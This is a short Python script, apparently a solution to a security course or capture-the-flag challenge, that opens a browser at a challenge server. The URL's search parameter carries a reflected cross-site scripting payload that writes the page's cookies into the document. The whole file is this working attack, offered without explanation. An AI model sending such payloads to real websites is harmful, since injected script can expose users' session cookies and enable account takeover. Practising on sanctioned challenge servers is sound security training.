import requests
import webbrowser

SERVER = "http://ssof2526.challenges.cwte.me"
PORT = 25251

link = f"{SERVER}:{PORT}"

# Create a session
s = requests.Session()

webbrowser.open(link + "/?search=<script>document.write(document.cookie)<%2Fscript>")
